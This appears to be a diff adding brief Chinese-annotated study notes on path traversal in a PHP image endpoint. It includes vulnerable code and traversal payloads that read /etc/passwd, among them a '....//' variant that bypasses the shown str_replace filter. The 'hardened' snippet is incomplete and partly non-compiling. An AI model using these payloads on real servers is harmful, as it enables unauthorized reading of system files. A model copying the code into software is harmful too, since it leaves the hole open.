@@ -1,0 +1,48 @@
+/image.php?file=1.png
+
+根目录
+/aaa/bbb
+              image 目录
+                          1.png
+                          2.png
+                          3.png
+
+              image.php
+              $file = $_GET['file']	
+              $path = "./image/" . $file
+              echo file_get_content($path)
+
+/image.php?file=../../../etc/passwd
+              $file = ../../../etc/passwd
+              // /aaa/bbb/image/../../../etc/passwd
+              $path = "./image/../../../etc/passwd"   -> /etc/passwd
+              echo file_get_content($path)
+
+/aaa
+/aaa/bbb
+/aaa/bbb/ccc
+
+/image.php?file=../../../../../../../../../../../etc/passwd
+/image.php?file=../image.php
+
+<?php
+$file = $_GET['file'];
+$file = str_replace('../', '', $file);
+$path = realpath("./image/" . $file);  -> /etc/passwd
+// 变成绝对路径，限制只能访问某个目录下面的资源
+// /web/shop-com/image
+if (!file_exists($path)) {
+   http_response_code(400);
+   echo "No such image!";
+} else {
+   header('Content-Type: ' . mime_content_type($path));
+   echo file_get_contents($path);
+}
+
+payload 
+
+../../../../../../../../../../../etc/passwd
+....//....//....//....//....//....//....//....//....//....//....//etc/passwd
+...
+
+
